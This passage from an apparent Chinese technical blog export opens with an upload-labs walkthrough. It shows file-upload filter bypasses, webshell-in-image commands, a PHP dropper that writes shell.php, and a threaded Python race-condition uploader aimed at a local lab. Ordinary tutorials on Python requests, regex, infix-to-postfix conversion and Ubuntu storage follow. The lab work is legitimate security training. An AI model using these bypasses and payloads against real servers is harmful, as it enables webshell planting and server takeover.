搜索参数在字符串中的位置，并返回从该位置到字符串结尾的所有字符 如果有多个，匹配的是最后一个（这里并没有进行递归检测，前面的就会漏掉） 如果是a.php. jpg.是不能正常解析的，但是a.php. .就行 绕过：多写一个空格和点：上传文件 info.php， burp修改file为info.php. . 比如： 1a.php. . 去空：a.php. . 删除末尾点：a.php. 最后一个点被deldot删除 返回最后一个点的内容. 第二个strrchr匹配了第一个点和后面的空格 前后去空：后缀为., 不在黑名单范围，成功绕过 最后上传文件名为：a.php., 在windows保存文件的之后的.会消失 如下图，win服务器保存的文件： 正常解析： ## Pass-06 没有进行后缀名大小写转换 绕过burp修改filename后缀名为.phP，绕过检测，上传OK 正常解析 Pass-07 最后没有将后缀首尾去空 可以利用win文件名字保存格式的特性: 比如最后一个为空格info.php, .php不在黑名单.php等中，成功绕过， 并且windows保存的时候会把最后的空格去除 绕过burp修改filename为info.php，后面加一个空格，上传 Pass-08 少了提前删除文件名末尾的点 的功能(deldot)； strrchr过滤匹配的是最后一个点； 没有对上传的文件重命名 绕过:F1： 后缀名加点绕过 burp修改文件名， 1a.php. a.php.可以带空格 上传。 F2：利用Windows解析漏洞（后缀修改为1.php:1.jpg） 11.php:1.jpg 没成功： 上传的是1.php，但是文件内容是空的了 ​ ​ Pass-09 Windows文件流绕过 少了 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA –&gt; 含义：把后缀中是 ::DATA替换为空 str_ireplace(&#39;要替换的对象&#39;,&#39;替换为&#39;,&#39;字符串&#39;)函数 由上可知，文件没有对后缀名进行去”::DATA”处理。 php在window的时候如果文件名+”::DATA”处理。php在window的时候如果文件名+”::DATA”处理。php在window的时候如果文件名+”::DATA”会把::DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::DATA”之前的文件名 他的目的就是不检查后缀名。 ps:只能是Windows系统，并且只能时php文件 绕过1info.php::$DATA 1.如图 ，在BP中修改图片马的 jpg 的后缀名，将其改为 php ，并且在后面加上 ::$DATA ; 2.在网页上检查图片马的执行情况时，将图片马的后缀名中 ::$DATA ，删去，便可浏览。 如图，这个是没有去掉后缀时，会发生报错。（因为我们实际上传的是PHP文件，即upload文件夹中只有php文件，而不存在带有后缀 ::$DATA的文件） Pass 10 - 11 （将filename拼接路径会带来极大风险）Pass-10 绕过构造后缀名点空绕过 strrchr函数 搜索参数在字符串中的位置，并返回从该位置到字符串结尾的所有字符 如果有多个，匹配的是最后一个（前面的就会漏掉 由上可知，该关进行的是现在文件末尾先去点，再去空便没有再做任何处理，因此我们可以利用这个漏洞，构造后缀名为php+点+空+点 burp修改文件名info.php. . Pass-11 双写绕过 没有strrchr str_ireplace函数： str_ireplace(&#39;要替换的对象&#39;,&#39;替换为&#39;,&#39;字符串&#39;), 他把我们的php后缀替换为空 函数缺陷： 只是执行一次/或者没采用递归过滤 绕过扰乱，删除里面后，外面还能组合成功后缀 burp修改filename=info.pphphp info.pphphp — &gt; ‘info.php’ Pass 12 - 13 将filename当做变量加入最终路径会带来极大风险Pass - 12 GET请求，URL网页上00截断 前提条件：php5.34以下， magic_quotes_gpc为off状态 魔术引号 magic_quotes_gpc 作用： 对（反斜杠？，单引号，双引号，none）产生影响, 自动加上/ 白名单绕过 save_path可控， $_GET[&#39;save_path&#39;] 通过get获取，可以把get中url参数带上00截断 %00 截断（类似注释符号，后面的不再执行） Note： %00 是URL编码后的结果， 选中，解码转换（url decode）为小方块，才是真正的%00, Hex下是00 数据包中 save_path=../upload/shell.php%00 （注意 url_decode）后面的就没用了，filename=”shell.jpg” 由源码可知，图片的save_path通过get传递，然后和后缀ima_path直接拼接而成的，所以我们可以直接使用 %00 截断，将后缀名 .jpg 截断，从而以 php 运行 绕过URI中00截断 方法一：拦包00截断 由于是在get的url中，%00就不进行decode了， 上传成功： 查看图片路径： 查看服务器保存文件： 访问的时候，去掉后面的jpg，只访问php，OK： 方法二：前端直接修改为 “php+00截断”格式 如下可得，直接将参数save_path修改为php+00截断的格式，因此它会将之后上传的所有文件以PHP的格式进行解析。 ps:图片是盗取的 burp只修改下面的filename为x.jpg即可 Pass - 13 POST请求，00截断 白名单绕过 F1: 同12关，只是修改的地方不同 1.burp拦截。在post后面加上info.php%00 (%00是url decode之后的)，再发送即可 2.burp拦截，然后在上面的upload 的后面加上 123.php+（这里的123可以为任何名字，他只是一个代号。并且 php后面的 +好也是一个标记，他的二进制代码为 2b） 由上可知，将二进制中的 + 改为 00 截断，即将 + 的二进制码 2b 改为 00 . 同样，访问的时候访问php文件： F2 意外发现：文件覆盖 由于名字可以不相同，即我们可以任意定义uploads旁边的 PHP 文件名，如果将文件名改为uploads中本身存在的文件，那么新的文件将会覆盖原来的文件。 Pass - 20 （也是类似的，便于比较就放这里了） 这里进行过滤的是他的那个文件名，而不是我们上传文件最开始的文件名，所以要在他的文件名上做手脚 $file_ext = pathinfo($file_name,PATHINFO_EXTENSION) 返回拓展后缀 这里的文件名filename是可控的： $_POST[&#39;save_name&#39;] 绕过 我们可以在save_path中加入php+00截断，由于是POST发送方式，因此我们需进行00截断。111.php%00upload-19.jpg （注意url decode） 上传OK： 去掉00后面内容，访问php，正常解析 Pass14 - 17 （文件包含漏洞）Pass - 14 获取文件头进行了验证 图片马制作： win下：copy a.jpg /b + b.php /a shell.jpg Linux下：cat a.jpg b.php &gt; shell.jpg 文件包含漏洞（xx.php?file=uploads/x.jpg） 文件不限格式后缀 意义：如果存在包含漏洞，需要上传一张图片(图片马)，就可以getshell $strInfo = @unpack(&quot;C2chars&quot;, $bin);// C为无符号整数，网上搜到的都是c，为有符号整数，这样会产生负数判断不正常 $bin = fread($file, 2); //只读2字节进行验证 表示只是对文件头做了检测 $strInfo = @unpack(&quot;C2chars&quot;, $bin); 标示前两个字符按照，c格式，数组索引chars1,chars2 @unpack $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]); 文件头： 不同后缀类型文件头部代码中有GIF89a,NG,PK,7Z， 部分验证会验证文件头 常见文件头：https://blog.csdn.net/xiangshangbashaonian/article/details/80156865 突破： 伪造可行的文件头 绕过上传图片马，上传。打开测试页面，引用刚才的图片马 Pass - 15 getimagesize 函数拓展：getimagesize（） 判断是否为一个完整的图像 索引2$info[2] 是图像的类型 image_type_to_extension 获取的是MIME类型 123456$info = getimagesize($filename);$ext = image_type_to_extension($info[2]); # 获取后缀jpeg , $info[2] 是文件类型if(stripos($types,$ext)&gt;=0) # 是否在白名单中 绕过上传图片马， 打开测试页面，直接包含includefile=’文件.jpg’, 就是当成php解析 Pass - 16 php_exif模块 函数拓展：exif_imagetype（） php_exif模块来判断文件类型 版本：PHP&gt;=4.3.0, PHP5, PHP7 绕过需要开启php_exif模块： 1.打开配置文件，php拓展，php_exif打开； 2.配置文件在php.ini,分号是注释，可以直接解除注释启用,并将此行移动到extension=php_exif.dll之前，使之首先加载*。 上传图片马（注意MIME与后缀和文件头要一直，然后打开测试页面，包含gif，OK Pass - 17 （图片二次编码）其实就是检测两次 本质： 检测 MIME和后缀是否对应 原理： 将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。 具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。 123//使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); 绕过好了，还是太菜，还是看大佬的解决方案学习学习把吧:点击这里 1.GIF 关于绕过gif的二次渲染,我们只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了. 2.PNG png的二次渲染的绕过并不能像gif那样简单. 3.JPG ps: 这一关是二次渲染的，还是多学习学习吧 18 -19 条件竞争 （多线程发包）Pass - 18 unlink函数： 数删除文件。若成功，则返回 true，失败则返回 false 执行步骤： 1.取出上传文件的后缀名 2.临时文件移动（move_uploaded_file）到一个路径下面， 3.如果后缀名在白名单，进行最后移动，保存 4.如果后缀名不在白名单，unlink删除临时文件 绕过 趁他不注意（多线程），在临时文件里面写一个创建后门文件的功能，这样虽然临时文件不满足被删除，但是自己自动创建的文件已经存在服务器目录了 F1： 其中，诱饵上传文件代码 1234567891011&lt;?php$myfile = fopen("shell.php", "w") or die("Unable to open file!");$txt = "&lt;?php phpinfo(); ?&gt;\n";fwrite($myfile, $txt);fclose($myfile);?&gt; 然后，如果已知新建文件的路径，可以直接访问 ​ 如果不知道，可以抓取数据包查看 方法： 1.利用burp的Intruder使用多线程发包(如下图)， 2.然后不断在浏览器访问我们的webshell，会有一瞬间的访问成功。（即当线程足够的时候 ，将可能会跳过某个步骤，而直接访问到我们的 webshell，新文件也会创建成功 ) F2: Python 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788\#!/usr/bin/env python3\# coding:utf-8import hackhttpfrom multiprocessing.dummy import Pool as ThreadPooldef upload(lists):​ hh = hackhttp.hackhttp()​ raw = """POST /upload-labs/Pass-17/index.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://127.0.0.1/upload-labs/Pass-18/index.phpCookie: pass=18Connection: closeUpgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=---------------------------6696274297634Content-Length: 341-----------------------------6696274297634Content-Disposition: form-data; name="upload_file"; filename="18.php"Content-Type: application/octet-stream&lt;?php$myfile = fopen("shell.php", "w") or die("Unable to open file!");$txt = "&lt;?php phpinfo(); ?&gt;\n";fwrite($myfile, $txt);fclose($myfile);?&gt;-----------------------------6696274297634Content-Disposition: form-data; name="submit"上传-----------------------------6696274297634--"""​ code, head, html, redirect, log = hh.http('http://127.0.0.1/upload-labs/Pass-17/index.php', raw=raw)​ print(str(code) + "\r")pool = ThreadPool(10)pool.map(upload, range(10000))pool.close()pool.join() 只是把burp换成了python，其他操作方法是一样的 修复问题应该先判断文件类型，再移动 Pass - 191if( $this-&gt;cls_rename_file == 1 )&#123; //是否用$im_path成功给$upload_file重命名 和第18关有点类似，都对关键进行了重命名，由于我们是利用burp不断的发送相同的包，那么一旦有两个包同时传到这边是，那么系统对一个重命名时，另一个刚好“逃脱”了，那么上传成功。 绕过在这关是一个白名单，利用了appche的一个解析漏洞，它会将 “.php.7z 当作.php来解析，而刚好 “ .php.7z ”又属于白名单， 所以上传一个 “ .php.7z ” 的文件，然后 再利用条件竞争漏洞进行多线程不断的发送 “ .php.7z”的文件， 由于版本问题，这次的文件没有上传到upload的文件夹下面，而是上传到 WWW 的文件夹下面，但是不影响，并且这次的文件上传后就不会被删掉，就会保存在 该文件夹下面，这样的话我们将可以稳定的访问到。 可以看到，burp进行多线程发包后，在浏览器一致访问上传文件的地址，一定会有那么一瞬间会访问到（这时，文件里新建webshell的代码执行了，新的后门建立成功了，我们就可以访问后门了） 00截断和move_uploaded_file（）函数Pass - 20pathinfo(）函数：以数组的形式返回关于文件路径的信息。 pathinfo(path,options) move_uploaded_file(A,B)函数：此函数将会检查文件A是否是合法的上传文件，如果是，将把文件A移动到B的目录下；否则将会返回false，并且不执行任何操作。 绕过方法一： %00截断 （前面已经写了） 111.php%00upload-19.jpg 其中，%00是url-decode之后的 方法二： 利用move_uploaded_file（）函数和黑名单结合存在的漏洞： move_uploaded_file（A,B）函数：此函数将会检查文件A是否是合法的上传文件，如果是，将把文件A移动到B的目录下；否则将会返回false，并且不执行任何操作。 由于这里利用了黑名单，则move_uploaded_file（）函数在判断时只会判断是否为黑名单，如果不是，那么他将会直接将文件保存在指定目录下。所以在这里我们利用 /.(斜杠点)和 空格（空格）进行绕过。 （1） “/.”(斜杠点) ​ upload-19.php/. （2）“ ”（空格） ​ upload-19.php ​ （3）“ .”（空格） upload-19.php. upload-19.php. 点+空格 等等… 方法三： Windows冒号截断 1upload-19.php:.jpg (我做的实验，php上传成功，但是内容清空了) Pass - 21 参考: https://blog.csdn.net/kekefen01/article/details/90346413 通过传递数组绕过。属于逻辑漏洞，没有考虑数组第二个元素不存在的情况。 绕过使用多个数组 12345678910111213141516171819202122232425262728293031323334353637------WebKitFormBoundaryDTdqZdRoon2GpWOEContent-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;info.php&quot;Content-Type: image/jpeg&lt;?php phpinfo();?&gt;------WebKitFormBoundaryDTdqZdRoon2GpWOEContent-Disposition: form-data; name=&quot;save_name[0]&quot;info.php/------WebKitFormBoundaryDTdqZdRoon2GpWOEContent-Disposition: form-data; name=&quot;save_name[2]&quot;jpg------WebKitFormBoundaryDTdqZdRoon2GpWOEContent-Disposition: form-data; name=&quot;submit&quot;上传------WebKitFormBoundaryDTdqZdRoon2GpWOE-- 最终文件名为“info.php/.” 因为move_uploaded_file底层会调用tsrm_realpath函数导致，递归删除文件名最后的/. 参考文章：https://blog.csdn.net/weixin_43901038/article/details/94890631 https://www.cnblogs.com/shellr00t/p/6426945.html https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python之requests库]]></title>
    <url>%2Fpython%E4%B9%8Brequests%E5%BA%93%2F</url>
    <content type="text"><![CDATA[Requests是基于urllib3来改写的，采用Apache2 Licensed 来源协议的HTTP库。 它比urllib更加方便，可以节约我们大量的工作，完全满足HTTP测试需求。 安装pip install requests 使用测试网站http://httpbin.org/ GET请求123456789101112131415161718192021import requests# 不带参数r = requests.get('http://httpbin.org/get')print(r.text)# 携带参数data = &#123; 'name':'zhangsan', 'age':20,&#125;r1 = requests.get('http://httpbin.org/get', params=data)r3.encoding = 'utf-8' # 设置编码print(r1.text)#如果是中文或者有其他特殊符号，则进行url编码from urllib.parse import urlencodejob = "程序员"parm = urlencode(job, encoding="utf-8")# 再进行拼接后进行后续请求... POST请求1234567891011121314import requests# 不带参数r = requests.post('http://httpbin.org/post')print(r.text)# 携带参数data = &#123; 'user': 1, 'pwd': 'hhh', 'submit': 'submit',&#125;r1 = requests.post('http://httpbin.org/post', data=data) 请求头1234567891011121314151617# 自定义请求头headers = &#123; 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36',&#125;response1 = requests.get(url, headers=headers,params=data)# 打印请求头print(response1.request.headers)# 两种遍历方式for key, value in r3.headers.items(): print(key+":"+value)print("************************************")for key in r3.headers: # 不是请求头 print(key + ":" + (r3.headers)[key]) 响应信息12345678910111213141516171819202122232425262728293031323334# 响应头print(response1.headers)# 其他信息print(response1.headers['Server'])print(response1.url) # 打印urlprint(response1.status_code) # 状态码 200print(response1.cookies.items()) # cookieprint(response1.apparent_encoding) # 提供的编码print(response1.elapsed) # 请求到响应的时间print(r.history) # history属性得到请求历史# cookie操作print(response1.headers['Set-Cookie'])print(response.text) # 响应返回的数据: strprint(response.content) # 响应返回的数据: 二进制形式# 对文件内容查找(比如被安全狗拦截后页面中会有关键字:`safedog`)...if response.text.find('safedor'): print('被拦截')else: print('绕过')... # 比如爬图片，音乐，视频就是用的二进制数据import requestsresponse = requests.get('http://xpshuai.cn/favicon.ico')# 保存图片 wb写入with open('favicon.ico','wb')as f: f.write(response.content) 解析json使用json（）方法，就可以将返回结果是JSON格式的字符串转化为字典 1234567import requestsr = requests.get('http://httpbin.org/get')print(r.text)print(type(r.text)) # &lt;class 'str'&gt;print(r.json())print(type(r.json())) # &lt;class 'dict'&gt; SSL证书检验123# 参数 verify=False时表示，对于 https 不验证证书 r = requests.get(url1, verify=False) 设置代理12345import requestsproxies = &#123;'http': ' http://127.0.0.1:8080', 'https': ' https://127.0.0.1:8080'&#125;r = requests.get(url, proxies=proxies, verify=False) 可以设置代理池, 随机更换 123proxies = []request = requests.get(url, proxies=&#123;'http': random.choice(proxies)&#125;, headers=head) 自定义cookie123#打印cookiefor key,value in r.cookies.items(): print(key + '=' + value) 1.简单的做法: 12345678910import requests headers = &#123; "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/" "537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"&#125; cookies = &#123;"cookie_name": "cookie_value", &#125;response = requests.get(url, headers=headers, cookies=cookies) 2.CookieJar 更专业的方式:先实例化一个RequestCookieJar的类，然后把值set进去，最后在get,post方法里面指定cookies参数 12345678910from http.cookiejar import CookieJarrequests.cookies.update()c = requests.cookies.RequestsCookieJar()c.set('cookie-name', 'cookie-value', path='/', domain='.abc.com')s.cookies.update(c) 3.requests.Session()方法 12345session = requests.Session()session.cookies['cookie'] = 'cookie-value'# 功能：可以添加cookie，不会清除原cookie# 缺点：不能设置path，domain等参数 session会话维持 在requests中，如果直接利用get（）或post（）等方法的确可以做到模拟网页的请求，但是这实际上是相当于不同的会话，也就是说相当于你用了两个浏览器打开了不同的页面。 1234567891011121314151617181920import requests headers = &#123; "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "User-Agent" : "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.6) ",&#125; #设置一个会话session对象ss = requests.session()resp = s.get('https://www.baidu.com/s?wd=python', headers=headers)# 打印请求头和cookiesprint(resp.request.headers)print(resp.cookies) # 利用s再访问一次resp = s.get('https://www.baidu.com/s?wd=python', headers=headers) # 请求头已`保持`首次请求后产生的cookieprint(resp.request.headers) 异常处理进行网络请求的时候，难免会出错，这时候为了程序能够继续运行下去，就要对异常进行处理 12345678910111213# 最简单的一种try: # 请求过程 r = requests.get(url1, headers=headers, verify=False, params=data, cookies=cookies) # ...... except Exception as e: time.sleep(1) print(e) finally: print("程序执行结束!") 文件上传12345678import requestsfiles = &#123; 'file':open('favicon.ico','rb')&#125;r = requests.post('http://www.httpbin.org/post',files=files)print(r.text)]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>requests</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python正则表达式]]></title>
    <url>%2Fpython%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[常用正则表达式来对爬取的网页进行解析，但是正则表达式的构造稍微复杂一点，一般在结构化的网页中没必要用正则（易出错） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159# findalla = re.findall('jianeng',s ) ## 搜索字符串，以列表类型返回全部能匹配的子串print(a)#search() # 在一个字符串中搜索，匹配正则表达式的第一个位置，返回match对象 &lt;_sre.SRE_Match object; span=(1, 8), match='jianeng'&gt; 只能找到第一次出现的a = re.search('jianeng',s)print(a)#finditer() # 搜索字符串，返回一个匹配结果的迭代类型， # 每个迭代元素是match对象s = 'sjianengsdfasjianeng15sadfjianeng666'finditer = re.finditer('jianeng',s)print(finditer )##获取match对象中的值for i in finditer: print(i) print(i.group()) #froup() 返回匹配到的字符串 print(i.start() ) #返回匹配的开始位置 print(i.end() ) #返回匹配的结束位置 print(i.span() ) # 返回一个元组表示匹配位置（开始，结束）#sub() # 替换 类似于字符串中 replace() 方法s2 = re.sub('jianeng','666',s,count=2)print(s2)# compile() # 编译正则表达式为模式对象a = re.compile('jianeng') # a 要匹配jianengdd='fsadfasfjkjianeng'b = a.findall(dd)print(b )#re.split() # 将一个字符串按照正则表达式匹配结果进行分割，返回列表类型c = re.split('jianeng',s,maxsplit=2)print(c)import re#####元字符##通配符 -&gt; . 点 -&gt; 表示任意一个字符res = re.findall(r'a','abcad') #统一使用r取消转义 去右边字符串中找所有满足左边格式的子字符串print(res) #['a', 'a']res = re.findall(r'a..','abcad')print(res) #['abc']##锚点元字符# ^ 锁定行首res = re.findall(r'^a.','abcad')print(res) #['ab']# $ 锁定行尾res = re.findall(r'a.$','abcad')print(res) # ['ad']##单词边界(不是元字符)： \bres = re.findall(r'dog','Just dog Monica doggie Irene')print(res) # ['dog', 'dog'] #第二个dog不是单独的dog单词res = re.findall(r'\bdog\b','Just dog Monica doggie Irene')print(res) # ['dog']###重复元字符####贪婪 （尽可能匹配的多）res = re.findall(r'ab&#123;4&#125;c','abbbbc') #连续4个b 把花括号前面紧挨着的重复多少次print(res) #['abbbbc']res = re.findall(r'ab&#123;2,4&#125;c','abbbc') #匹配2到4个b #正则不许加空格print(res) #['abbbc']res = re.findall(r'ab&#123;2,&#125;c','abbbbbbbbbc') #匹配2的到多个，至少2个print(res) #['abbbbbbbbbc']###res = re.findall(r'ab*c','abbbc') # * 任意多个重复, 相当于&#123;0,&#125;print(res)res = re.findall(r'ab+c','abbbc') # * 一个或多个，一到正无穷,相当于 &#123;1,&#125;print(res)res = re.findall(r'ab?c','abbbc') # * 一个或者没有 ,相当于 &#123;0,1&#125;print(res)######非贪婪 (尽可能匹配的少) 后面加一个 ？res = re.findall(r'ab*','abbc') # 这是贪婪print(res) #['abb']res = re.findall(r'ab*？','abbc')print(res) # 这是非贪婪# *? #任意多个# +? #一个或多个# ?? #一个或没有###选择元字符 |res = re.findall(r'ab|bc','abc-adc-aec-bca') #二选一 # | 或print(res) # ['ab', 'bc'] #选的是正则表达式res = re.findall(r'a[bd]c','abc-adc-aec-bca') # 多选一 ， [] 方括号 表示你想要列举的所有情况，但是,仅仅一个字符print(res) # ['abc', 'adc'] #选的是方括号里面的一个字符 ， 【】里面的逗号表示匹配逗号res = re.findall(r'a[^bd]c','abc-adc-aec-bca') # ^在[]里面的话，放在第一位，表示反向print(res) # 除了b和dres = re.findall(r'a[a-e]c','abc-adc-aec-bca-a^c') #用 - 连接表示范围 [a-zA-Z0-9_]任意字母数字下划线print(res)####转义元字符 匹配字符本身 \ 反斜杠res = re.findall(r'.+.','1+2')print(res) #['1+2'] 不是匹配到了加号res = re.findall(r'1\+2','1+2') #得到元字符的字面值print(res) #['1+2']######预定义字符类# \d #任一数字字符 -&gt; [0-9]# \D #任一非数字字符 -&gt; [^0-9]# \s #任一空白符 -&gt; [\t\n\x0B\f\r]# \S #任一非空白符 -&gt; [^\t\n\x0B\f\r]# \w #任一字母数字字符 -&gt; [a-zA-Z0-9]# \W #任一非字母数字字符 -&gt; [^a-zA-Z0-9]######分组res = re.findall(r'a(bc)+d','abcbcbcd') #只能匹配一个bc 括号里面的变成一个整体 一个括号就是一个组print(res) # ['bc']res = re.findall(r'(a(bc)+d)','abcbcbcd') #大组套小组print(res) # [('abcbcbcd', 'bc')]res = re.findall(r'a(b|c)c','abc-acc-adc-aec') #与a[bc]c类似print(res) # ['b', 'c']##按组提取数据res = re.findall(r'(\w+)-(\w+)-(\w+)-(\w+)','abc-dc-acc-aaec')print(res) # [('abc', 'acc', 'adc', 'aec')]res = re.search(r'(?P&lt;year&gt;\d+)-(?P&lt;month&gt;\d+)-(?P&lt;day&gt;\d+)','2018-03-13')print(res.groupdict()) # &#123;'year': '2018', 'month': '03', 'day': '13'&#125;"""注意：如果正则表达式中使用了括号，那么findall函数匹配的结果只会是括号中的内容，而不是完整的匹配。因此我们可以利用这种机制来完整对需要部分的数据提取"""]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>正则</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中缀表达式转换为后缀表达式]]></title>
    <url>%2F%E4%B8%AD%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[中缀表达式转换后缀表达式3.1 规则 1、初始化栈和集合：运算符号栈s1和存储空间集合s2 2、从左到右扫描中缀表达式 3、遇到操作数时，将其加入s2 4、遇到运算符时，比较其与s1栈顶运算符的优先级 123- 4.1、如果s1为空，或栈顶运算符为左括号‘(’，则直接将此运算符入栈- 4.2、否则，若优先级比栈顶运算符的高，也将运算符压入s1- 4.3、否则，将s1栈顶的运算符弹出并加入到s2中，再次转到 流程4 5、遇到括号时： 12- 5.1、如果是左括号‘(’，则直接压入s1- 5.2、如果是右括号‘)’，则依次弹出s1栈顶的运算符，并且加入s2，直到遇到左括号为止，此时将这一对括号丢弃 6、重复步骤 2-5，直到表达式的最右边 7、将s1中剩余的运算符依次弹出并加入s2 8、s2结果即为中缀表达式对应的后缀表达式 3.2 实例以上面的转换为实例，比如输入 1 + ( ( 2 + 3 ) * 4 ) - 5，那么怎么转换成后缀表达式呢？ 扫描到的元素 s2集合中元素 s1(栈底-&gt;栈顶) 说明 1 1 空 数字 直接加入到集合中 + 1 + s1为空，直接入栈 ( 1 +( 左括号 直接入栈 ( 1 +( ( 同上 2 12 +( ( 数字 + 12 +( (+ s1栈顶是左括号，运算符直接入栈 3 123 +( (+ 数字 ) 123+ +( 右括号，弹出运算符直至遇到左括号 * 123+ +( * s1栈顶是左括号，运算符直接入栈 4 123+4 +( * 数字 ) 123+4 * + 右括号，弹出运算符直至遇到左括号 - 123+4 *+ - -与+优先级相同，因此弹出+号，在压入- 5 123+4 *+ 5 - 数字 到达最右端 123+4 *+ 5 - 空 s1中剩余的运算符 至此整个过程转换完毕 即中缀表达式1 + ( ( 2 + 3 ) 4 ) - 5 的后缀表达式为1 2 3 + 4 + 5 - 非原创原文链接：https://blog.csdn.net/qq_36144258/article/details/95075064]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-存储管理]]></title>
    <url>%2Fubuntu%20server-%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[基本篇 存储 对磁盘的所有操作都要小心小心再小心 磁盘是计算机中最主要的存储设备 传统磁盘分区与逻辑卷管理 事前合理规划很重要 对磁盘的所有操作都要小心小心再小心 磁盘空间管理 df 查看硬盘总体使用情况 123456789101112131415df"""第一列： 文件系统第二列： 存储空间（多少数据块）第三列： 使用量第四列： 可用量第五列：使用率第六列：挂载点"""df -h # 人性化的方式df -i # 查看inodes使用量 du 查看详细信息 是谁拿走了我的存储空间 12345678910111213141516du # 查看所有du / # 查看根目录/目录下的文件大小'''结合sudo权限''''-h # 人类易于阅读方式'sudo du / -h '- s # 汇总'sudo du /* -hs # 显示汇总结果'-c # 除了子文件和子目录之外，外加一个总和 'sudo du /usr/* -hsc 第三方工具 ncdu （比较人性化的工具）12345678apt install ncdu # 安装ncdu # 使用（可以方向键和回车进入返回从 查看）按住't' 先显示目录，再显示文件按住'g' 显示百分比'q'退出 添加硬盘 扩容 用vbox模拟添加硬盘：存储-&gt;SATA-&gt;添加硬盘 1.磁盘设备名称dmsg命令查看设备日志 /dev/目录下面可以查看设备的名称 ls /dev/sd 2.硬盘分区123456789101112131415161718192021222324## 1. fdisk-m 帮助菜单（查看参数）# 查看所有硬盘设备和分区情况sudo fdisk -l# 分区sudo fdisk /dev/sdb # 进入向导# 先创建分区表O # dos， MBR分区（基本分区） 传统分区格式，最大四个(主)分区，2T容量限制g # GPT 未来标准，128个分区，无容量限制，推荐使用# 会生成一个16进制的guid# 再创建分区n输入数字编号（后门会递增）第一个扇区在哪个位置【让扇区决定磁盘大小】输入结束扇区（默认最后一个扇区）【也可以直接输入100M这种方式】# 再保存分区w# 查看分区结果sudo fdisk -l 3.文件系统格式化mkfs 命令123sudo mkfs.ext4 /dev/sdb1sudo mkfs.xfs /dev/sdb2 Linux上常用的格式：ext4 （普通日常使用推荐）xfs （适用与超大空间比如100T, 多文件，数据库） 4. 挂载 绑定访问路径 一般两个挂载目录:/mnt/ 一般是硬盘等 （下面创建空的子目录再挂到子目录下）/media/ 一般习惯使用挂： u盘等移动存储 1.mount命令 (临时性的，重启之后失效)12345678# sdb代表那块硬盘， sdb1代表那个分区sudo mount /dev/sdb1 /mnt/storge/# -t 声明格式sudo mount /dev/sdb1 -t ext4 /mnt/storge/# 卸载目录下面的设备（如果busy就先退出这个目录先不要使用）sudo umount /storage 自动挂载 /etc/fstab123456789101112131415161718192021'''第一列：设备ID UUID， 唯一的标号/ 设备名也可以，推荐id第二列：挂载点 swap无需挂载(none)第三列：文件系统 ext4, swap...第四列：options （ 参数， error=remount-ro的意思是发生错误只读形式挂） 一般填写默认就行 defaults:rw,exec,auto,nouser.asynchronous（异步存储） nouser表示当前用户才可以第五列：dump （基本没用，写0不备份就行， 备份的时候才设置1） 一般写 0第六列：pass (FS错误时fsck是否检查错误，0不检查，1优先，2后查） 一般写 2'''实践：1.blkid 查看设备UUIDlsblk -fP 查看设备id2.编辑文件3.reboot 或者mount -a #将/etc/fstab的所有内容重新加载 高级篇 SWAP管理 可能是你的救命稻草 关于swap的争论 需要/不需要 （Raspberry Pi） 大小多少才合理（2-16G） Swap分区，swap文件 理想状态下应该无事可做的swap 大量的swap空间使用意味着服务器已疲于奔命 free -m free -h 查看内存以及swap的 某些云主机默认没有swap ubuntu中，是swap文件 Swap文件/swapfile #创建文件 制定大小，位置sudo fallocate -l 8G /swapfile #查看文件sudo 